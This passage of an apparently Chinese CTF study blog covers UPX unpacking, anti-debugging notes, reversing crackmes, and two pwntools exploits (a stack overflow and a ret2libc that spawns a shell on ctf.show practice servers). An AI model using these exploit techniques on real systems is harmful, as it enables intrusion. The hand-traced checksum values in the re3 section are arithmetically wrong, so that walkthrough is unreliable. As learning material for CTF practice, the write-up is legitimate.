alt="3032507-20230208105137216-81322655.png"                ><br>后面是一次大跳转，就会跳到OEP处，接着F8来到下图的位置<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681554075656-b392fc08-b198-453d-97cc-679c6af46097.png"                      alt="image.png"                ><br>继续执行到返回弹窗<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681554122591-4b7c66a4-8f27-478c-99a4-dc6861d454a2.png"                      alt="3032507-20230208105906624-210014495.png"                ><br>提示是返回的地方没有被定义为代码，问是否需要定义，选择Yes<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681554182408-b3dfa132-732b-4b36-a38f-27cbc8aa0321.png"                      alt="image.png"                ><br>这样就来到了OEP的位置<br>快捷键alt+F7点击上面的脚本，运行成功得到的dump文件就是最后我们需要的内存文件。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681549221746-300062d3-eb60-4182-968c-cd5ec1824cd1.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681549290571-310a7949-b7d9-43ff-9035-1f53b12e01eb.png"                      alt="image.png"                ><br>提示运行成功，报错<code>dump err</code>就检查之前设置的dump文件路径有没有错误的，这种方法获得是加壳之前的内存文件，转移到了dump文件中，接下来分析的就是路径下的dump文件了。</p><h4 id="planB-魔改UPX壳"><a href="#planB-魔改UPX壳" class="headerlink" title="planB:魔改UPX壳"></a>planB:魔改UPX壳</h4><p>已经判断了该程序的壳是UPX 但在010中会发现有vmp的壳，所以将upx壳的特征值改回来，之后再用机器脱壳<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681561295863-eef13c47-cdfd-4f0d-8b70-e06063721c56.png"                      alt="dbe259f3726f4b2199fd41878c5f5655.png"                ></p><h4 id="planC-其他方法"><a href="#planC-其他方法" class="headerlink" title="planC:其他方法"></a>planC:其他方法</h4><blockquote><p>方法1：单步跟踪<br>只向下调不向上调<br>方法2：ESP定律法<br>dd XXXXX<br>hr XXXXX<br>方法3：2次内存镜像法<br>方法4：一步直达法</p></blockquote><p><a class="link"   href="https://blog.csdn.net/m0_46296905/article/details/116049504" >https://blog.csdn.net/m0_46296905&#x2F;article&#x2F;details&#x2F;116049504 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681555194523-9b391741-4a1f-424b-920b-f1051b16d8d0.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681555208977-9e8b86cf-3c72-45e2-8971-9e00a99ec318.png"                      alt="image.png"                ><br>最后明显就是迷宫路线题，套路套路答案就出了，之前又搞过就不写了<br><a class="link"   href="https://www.cnblogs.com/r136a1/p/17101192.html" >https://www.cnblogs.com/r136a1/p/17101192.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/weixin_53349587/article/details/124676648" >https://blog.csdn.net/weixin_53349587&#x2F;article&#x2F;details&#x2F;124676648 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="CTFSHOW-9月刷题"><a href="#CTFSHOW-9月刷题" class="headerlink" title="CTFSHOW-9月刷题"></a>CTFSHOW-9月刷题</h1><p>密文解密网站：<br><a class="link"   href="https://txtmoji.com/" >https://txtmoji.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="pwn02"><a href="#pwn02" class="headerlink" title="pwn02"></a>pwn02</h2><p>栈溢出的题，直接接收溢出的字符串即可获得服务器权限</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;111.231.70.44&quot;</span>,<span class="number">28010</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x9</span>+<span class="number">4</span>) + p32(<span class="number">0x0804850F</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="pwn03"><a href="#pwn03" class="headerlink" title="pwn03"></a>pwn03</h2><p>开了aslr保护，同时字符串并没有直接给出栈溢出的点 即<code>bin/sh</code>的字样，涉及到plt和got表，</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="string">&#x27;28300&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">puts_add=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(puts_add)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_add)</span><br><span class="line">libcbase=puts_add-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_add=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(sys_add)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()                                                  </span><br></pre></td></tr></table></figure></div><h1 id="CTFSHOW-3月四周-20230320"><a href="#CTFSHOW-3月四周-20230320" class="headerlink" title="CTFSHOW-3月四周-20230320"></a>CTFSHOW-3月四周-20230320</h1><h2 id="武穆遗书"><a href="#武穆遗书" class="headerlink" title="武穆遗书"></a>武穆遗书</h2><p>fmf_my_reverse.exe<br>查壳upx先脱壳<code>upx -d [fileaddress]</code> 脱完后发现程序还是运行不了（程序是32位，所以无法在64位系统上运行）直接用ida反汇编<br>进入主函数发现使用了好多的api函数<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679286223360-32e3f38d-0e71-4928-98ba-37521fdc5499.png"                      alt="image.png"                ><br>分析一下这段代码</p><ol><li>调用三个未知函数sub_4011D0()、sub_401200()、sub_401280()</li><li>if判断，调用sub_401040()函数，如果函数返回值 !&#x3D;0，即执行exit(0)退出程序；</li><li>v4 &#x3D; (const char *)operator new(0x1Cu); 使用C++中operator new运算符动态分配内存，申请了一块内存大小是0x1C字节，返回的指针存储在v4中</li><li>sub_401390((int)v4, (int)v5, (int)&amp;unk_4070F4, 28)调用了sub_401390函数，将v4, v5, &amp;unk_4070F4, 28作为参数传递给函数</li><li>同2</li><li>进入while的无限循环，</li><li>gets(v6);观察下面的函数，知道gets函数从输入中读取用户输入的字符串，存储在v6中，gets函数存在缓冲区溢出的风险</li><li>fflush((FILE *)iob[0]._ptr);百度知道是为：清空输入缓冲区，防止缓冲区溢出</li><li>if ( !strcmp(v4, v6) )  break; 相等的话就跳出循环，否则输出密码错误的提示信息</li></ol><p> <code>printf(&quot;password error!!! please  try again!\nyour input is %s \n&quot;, v6);</code></p><ol start="10"><li>跳出循环即输出成功信息<code>printf(&quot;win!!!the password and your input are all  %s\n&quot;, v6);</code>，并打印用户输入的密码</li><li>最后执行Command的系统命令</li></ol><p>下断点调试，老是会闪退，查了之后推测是用了反调试的手段</p><blockquote><p>其他反调试手段：</p><ol><li>检测调试器：软件会检测调试器的存在，并根据检测结果采取相应的行动，例如自我终止、运行不同的代码等。</li><li>检测断点：软件会检测是否在代码中设置了断点，如果检测到断点，可能会改变代码执行路径，或自我终止等。</li><li>检测调用栈：软件会检测调用栈，以查找是否存在调试器，如果存在，则可能会改变代码执行路径，或自我终止等。</li><li>加壳&#x2F;加密：软件加壳或加密后，使得调试器无法直接读取程序代码和数据，这样可以防止反汇编和调试。</li><li>虚拟化：软件会在虚拟机中运行，使得调试器无法直接访问真实的程序代码和数据，这样可以防止反汇编和调试。</li></ol></blockquote><p>大概有两种解法：<br>第一种就是nop掉程序中的exit后，程序动调就可以出flag<br>第二种attach the process，需要先把程序运行起来再选择才行，这个还是有点问题，改了程序的属性外加wow64文件夹，但发现程序还是会出现闪退的情况</p><h3 id="反汇编和反调试学习"><a href="#反汇编和反调试学习" class="headerlink" title="反汇编和反调试学习"></a>反汇编和反调试学习</h3><p>FS寄存器偏移值指向：<br>000 指向SEH链指针<br>004 线程堆栈顶部<br>008 线程堆栈底部<br>00C SubSystemTib<br>010 FiberData<br>014 ArbitraryUserPointer<br>018 FS段寄存器在内存中的镜像地址<br>020 进程PID<br>024 线程ID<br>02C 指向线程局部存储指针<br>030 PEB结构地址（进程结构）<br>034 上个错误号<br>原文链接：<a class="link"   href="https://cloud.tencent.com/developer/article/1142065" >https://cloud.tencent.com/developer/article/1142065 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="CTFSHOW-3月三周-20230316"><a href="#CTFSHOW-3月三周-20230316" class="headerlink" title="CTFSHOW-3月三周-20230316"></a>CTFSHOW-3月三周-20230316</h1><h2 id="re3-20230316-17"><a href="#re3-20230316-17" class="headerlink" title="re3(20230316-17)"></a>re3(20230316-17)</h2><p>先看伪代码，发现逻辑是非常清晰的，定义v17长度是8的整型数组，经过for循环给v16赋值.<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1678885012036-dff6e635-27d5-447f-84e9-09b8702cb95b.png"                      alt="image.png"                ></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  v7 = <span class="number">0x50</span>;</span><br><span class="line">  v8 = <span class="number">0xFAE3</span>;</span><br><span class="line">  v9 = <span class="number">0xD7D3F7B</span>;</span><br><span class="line">  v10 = <span class="number">0xA43499F6</span>;</span><br><span class="line">  v11 = <span class="number">5</span>;</span><br><span class="line">  v12 = <span class="number">0x10</span>;</span><br><span class="line">  v13 = <span class="number">0xEF9</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  puts(<span class="string">&quot;plz input the key:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  v3 = strlen(s);</span><br><span class="line">  strncpy(dest, v19, v3 - <span class="number">6</span>);</span><br><span class="line">  dest[strlen(s) - <span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  __isoc99_sscanf(dest, <span class="string">&quot;%x&quot;</span>, &amp;v5);</span><br><span class="line">  v17[<span class="number">0</span>] = v7;</span><br><span class="line">  v17[<span class="number">1</span>] = v8;</span><br><span class="line">  v17[<span class="number">2</span>] = v9;</span><br><span class="line">  v17[<span class="number">3</span>] = v10;</span><br><span class="line">  v17[<span class="number">4</span>] = (v11 &lt;&lt; <span class="number">12</span>) + v12;</span><br><span class="line">  v17[<span class="number">5</span>] = v13;</span><br><span class="line">  v17[<span class="number">6</span>] = v5;</span><br><span class="line">  v16 = 0LL;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( v16 += (unsigned <span class="built_in">int</span>)v17[i]; v16 &gt; <span class="number">0xFFFF</span>; v16 = v15 + (unsigned <span class="built_in">int</span>)(unsigned __int16)v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = (unsigned __int16)v16;</span><br><span class="line">      v15 = v16 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> ( v16 == <span class="number">0xFFFF</span> )</span><br><span class="line">    puts(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    puts(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div><p>需要得到的是输入的v5的值是什么四位数的值，v17数组最后一位是v5，暂且设置A是前面的得数 即A+v5&#x3D;&#x3D;0xFFFF返回“ok”。<br>一开始的时候我是直接将v17上面给的固定的值全部加了起来，最后发现这个数已经不是符合flag条件的4位数字了 所以肯定是哪边算错了<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1678885208244-d939b146-0f51-402c-98b7-d795f4b08f7a.png"                      alt="image.png"                ><br>后来发现for循环应该是一次一次的处理，v17[4]的值为0x5010，v17[5]的值为0xEF9，v17[6]的值是用户输入的数值。</p><blockquote><p>v17[4]&#x3D;0x5010 先将v11&#x3D;5（DEC）的值化成二进制的0101,&lt;&lt;左移12在低位补0 得到16进制的（v11&lt;&lt;12）的值即0x5000. v12&#x3D;0x10<br>v17[4]&#x3D;(v11&lt;&lt;12)+v12  &#x3D;&#x3D;&gt; 0x5000+0x10&#x3D;0x5010<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679035809354-e4f7ca1b-b090-48bf-9bd8-5df93a382bff.png"                      alt="image.png"                ></p></blockquote><p>每一次循环都将v16加上数组元素v17[i]的值，每轮循环结束后，将检查v16的值是否超过了16位的最大值0xFFFF。如果超过了，则将v16高16位（即进位）的值保存在v15中，并将v16的低16位截断，只保留其低16位的值。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">6</span>;++i)&#123;</span><br><span class="line"><span class="keyword">for</span>(v16+= (unsigned <span class="built_in">int</span>)v17[i]; v16 &gt; <span class="number">0xFFFF</span>; v16 = v15 + (unsigned <span class="built_in">int</span>)(unsigned __int16)v16)</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = (unsigned __int16)v16;</span><br><span class="line">    v15 = v16 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>都将v16加上数组元素v17[i]的值。在每轮循环结束后，将检查v16的值是否超过了16位的最大值0xFFFF。如果超过了，则将v16高16位的值保存在v15中，并将v16的低16位截断，只保留其低16位的值。<br>每一次运行的结果第一次循环：</p><ul><li>i &#x3D; 0</li><li>v17[0] &#x3D; 0x50</li><li>v16 &#x3D; 0 + 0x50 &#x3D; 0x50</li><li>v14 &#x3D; 0x50</li><li>v15 &#x3D; 0x00</li></ul><p>第二次循环：</p><ul><li>i &#x3D; 1</li><li>v17[1] &#x3D; 0xFAE3</li><li>v16 &#x3D; 0x50 + 0xFAE3 &#x3D; 0xFB33</li><li>v14 &#x3D; 0xFB33 &amp; 0xFFFF &#x3D; 0xB33</li><li>v15 &#x3D; 0xFB33 &gt;&gt; 16 &#x3D; 0x00</li></ul><p>第三次循环：</p><ul><li>i &#x3D; 2</li><li>v17[2] &#x3D; 0xD7D3F7B</li><li>v16 &#x3D; 0xFB33 + 0xD7D3F7B &#x3D; 0xD7D4EC0E</li><li>v14 &#x3D; 0xEC0E &amp; 0xFFFF &#x3D; 0xEC0E</li><li>v15 &#x3D; 0xD7D4 &amp; 0xFFFF &#x3D; 0xD7D4</li></ul><p>第四次循环：</p><ul><li>i &#x3D; 3</li><li>v17[3] &#x3D; 0xA43499F6</li><li>v16 &#x3D; 0xD7D4EC0E + 0xA43499F6 &#x3D; 0x7B09E904</li><li>v14 &#x3D; 0xE904 &amp; 0xFFFF &#x3D; 0xE904</li><li>v15 &#x3D; 0x7B09 &amp; 0xFFFF &#x3D; 0x7B09</li></ul><p>第五次循环：</p><ul><li>i &#x3D; 4</li><li>v17[4] &#x3D; (5 &lt;&lt; 12) + 0x10 &#x3D; 0x5010</li><li>v16 &#x3D; 0x7B09E904 + 0x5010 &#x3D; 0x7B09EE14</li><li>v14 &#x3D; 0xEE14 &amp; 0xFFFF &#x3D; 0xEE14</li><li>v15 &#x3D; 0x7B09 &amp; 0xFFFF &#x3D; 0x7B09</li></ul><p>第六次循环：</p><ul><li>i &#x3D; 5</li><li>v17[5] &#x3D; 0xEF9</li><li>v16 &#x3D; 0x7B09EE14 + 0xEF9 &#x3D; 0x7B09FD0D</li><li>v14 &#x3D; 0xFD0D &amp; 0xFFFF &#x3D; 0xFD0D</li><li>v15 &#x3D; 0x7B09 &amp; 0xFFFF &#x3D; 0x7B09</li></ul><p>第七次循环：</p><ul><li>i &#x3D; 6</li><li>v17[6] &#x3D; v5</li><li>v16 &#x3D; 0x7B09FD0D + v5</li></ul><p>最后逻辑崩盘，需要用动态调试搞一波，一开始写了一个C++脚本，</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> v17[<span class="number">8</span>] = &#123; <span class="number">0x50</span> ,<span class="number">0xFAE3</span>,<span class="number">0xD7D3F7B</span> ,<span class="number">0xA43499F6</span> ,<span class="number">0x5010</span> ,<span class="number">0xEF9</span> &#125;;</span><br><span class="line">    <span class="type">int</span> v14,v15,v16;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (v16 += (<span class="type">unsigned</span> <span class="type">int</span>)v17[i]; v16 &gt; <span class="number">0xFFFF</span>; v16 = v15 + (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">uint16_t</span>)v16)</span><br><span class="line">                &#123;</span><br><span class="line">                    v14 = (<span class="type">uint16_t</span>)v16;</span><br><span class="line">                    v15 = v16 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (v16 == <span class="number">0xFFFF</span>)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>发现存在报错的情况，逻辑上感觉没啥错误，像是操作不当的原因。<br>不过今天拓展了ubantu的gdb的界面<br>![0]]2I6&#96;M68H0NL14{9K~KKW.jpg](<a class="link"   href="https://cdn.nlark.com/yuque/0/2023/jpeg/23148330/1679066038125-c62305af-8599-43f5-920a-0d2cd122daa3.jpeg#averageHue=%23360e2d&clientId=u9a778dd9-a3b4-4&from=paste&height=945&id=u0bd99a6f&originHeight=945&originWidth=1470&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145816&status=done&style=none&taskId=uc38c23aa-33c4-4ba1-874d-aa7b5919727&title=&width=1470" >https://cdn.nlark.com/yuque/0/2023/jpeg/23148330/1679066038125-c62305af-8599-43f5-920a-0d2cd122daa3.jpeg#averageHue=%23360e2d&amp;clientId=u9a778dd9-a3b4-4&amp;from=paste&amp;height=945&amp;id=u0bd99a6f&amp;originHeight=945&amp;originWidth=1470&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=145816&amp;status=done&amp;style=none&amp;taskId=uc38c23aa-33c4-4ba1-874d-aa7b5919727&amp;title=&amp;width=1470 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>![Z7NWICH8I]6))BK)D_](OH6.jpg](<a class="link"   href="https://cdn.nlark.com/yuque/0/2023/jpeg/23148330/1679066054181-710e9645-46e5-49ea-8511-f6f29139b47c.jpeg#averageHue=%233f1c35&clientId=u9a778dd9-a3b4-4&from=paste&height=447&id=ue4024e80&originHeight=447&originWidth=833&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96201&status=done&style=none&taskId=u30a1fabe-93f0-4141-9d55-2eff5179bed&title=&width=833" >https://cdn.nlark.com/yuque/0/2023/jpeg/23148330/1679066054181-710e9645-46e5-49ea-8511-f6f29139b47c.jpeg#averageHue=%233f1c35&amp;clientId=u9a778dd9-a3b4-4&amp;from=paste&amp;height=447&amp;id=ue4024e80&amp;originHeight=447&amp;originWidth=833&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=96201&amp;status=done&amp;style=none&amp;taskId=u30a1fabe-93f0-4141-9d55-2eff5179bed&amp;title=&amp;width=833 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>但貌似这个东西可以在ida里直接实现就好了，呜呜呜 准备明天去问问Pwn同学是咋搞的<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679155552698-9dad6849-b7d0-4e31-bf82-6e922e993327.png"                      alt="image.png"                ><br>一步一步跟进之后貌似发现了‘Error’的位置</p><h1 id="mingyue-exe-20230318"><a href="#mingyue-exe-20230318" class="headerlink" title="mingyue.exe(20230318)"></a>mingyue.exe(20230318)</h1><p>先关闭安全软件运行一个这个可执行文件，发现应该是有一串关于弹窗的代码出现，<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679124866042-5180b5d9-c2d9-4309-afa4-53a5489c2139.png"                      alt="image.png"                ><br>一般的会使用MessageBox的函数，这样的话，源代码应该是</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>,<span class="string">&quot;flag认证失败！&quot;</span>,<span class="string">&quot;师傅再接再励吧！&quot;</span>，MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>通过这个查找字符串的看是否存在与我们上面推测的弹窗的内容，可以看到有两段可疑字符和一个MessageBoxW的标志<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679125531025-a4c72ff8-745f-49e5-9a6e-0b281a509b0f.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679125482046-77c364f2-367a-4bc1-a779-60e2a1d1c8d8.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679130554161-64b9240b-583a-467d-9d5e-5a7545fab497.png"                      alt="image.png"                ><br>查看字符的地址与所在函数之后，查看主函数的逻辑<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679126259510-e569c16f-c993-4664-8bde-d1cd0afa84f0.png"                      alt="image.png"                ><br>貌似主函数看不出什么弹窗的源代码和提示flag的地方，突破口就是可以输入的地方sub_140001080函数，n一下将v3改为input 跟进一下函数，参数v3对应就是这里的char <em>a1，同改a1为input_num。a4890572163qwe函数就是我们刚刚发现的可以字符串的函数，n为string 整理一下函数和变量的名字。这段的代码就是给刚刚第一段的’)(</em>&amp;^%489$!057@#&gt;&lt;:2163qwe’进行加密的运算<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679133005708-6ad152b4-8443-4688-9f72-277060412ea3.png"                      alt="image.png"                ><br>其中两个重要的函数xor和judge函数</p><h3 id="xor函数的分析"><a href="#xor函数的分析" class="headerlink" title="xor函数的分析"></a>xor函数的分析</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679133581939-3fcaac42-ec7b-400a-ae6c-ab18721f5414.png"                      alt="image.png"                ><br>可以通过以下几个特征来看出这是一个链表节点<br>特征</p><ol><li>所占空间大小判定：内存块大小为 16 字节，一个链表节点通常需要存储两个指针，即指向下一个节点的指针和指向前一个节点的指针，每个指针通常需要占用 8 个字节的空间（在 64 位系统中），因此一个链表节点通常需要占用 16 个字节的空间。</li><li>特征函数判定：通过 malloc 函数分配内存块，这是链表节点动态内存分配的一种常见实现方式，因为链表节点数量通常不固定，所以需要动态分配内存来保存它们。</li><li>指针数组判定：通过一个指针数组来表示链表节点，返回值是一个指向 <strong>_QWORD</strong> 类型的指针，它指向了一个内存块，这个内存块的大小是 16 字节，即一个链表节点的大小。</li><li>通过将新分配的内存块的地址存储在全局变量中，将新节点插入链表的头部。这表明这是一个单向链表的实现方式。</li><li>内存块的第一个字节用来存储字符类型的值，这表明这个链表节点不仅包含指针，还包含数据。</li></ol><h3 id="judge函数的分析"><a href="#judge函数的分析" class="headerlink" title="judge函数的分析"></a>judge函数的分析</h3><p>改过之后的函数<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679151525094-72abd0f4-f580-4518-a268-530d67d5ba38.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1679151545151-66e1995c-fca6-4faf-a8d1-8674a12046f1.png#averageHue=%23fbfbfb&clientId=uf8617578-b3d4-4&from=paste&height=329&id=u3a277fd3&originHeight=329&originWidth=936&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15392&status=done&style=none&taskId=udb9a3083-83c1-4727-abb3-0414f34f5f1&title=&width=936"                      alt="image.png"                ><br>跟进最后两个函数，发现是两个我们上面猜测的弹窗的代码内容。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1679144772466-2a1d9bae-3429-43e1-9eea-22a4194d4af3.png"                      alt="image.png"                ><img                       lazyload                     src="/images/loading.svg"                     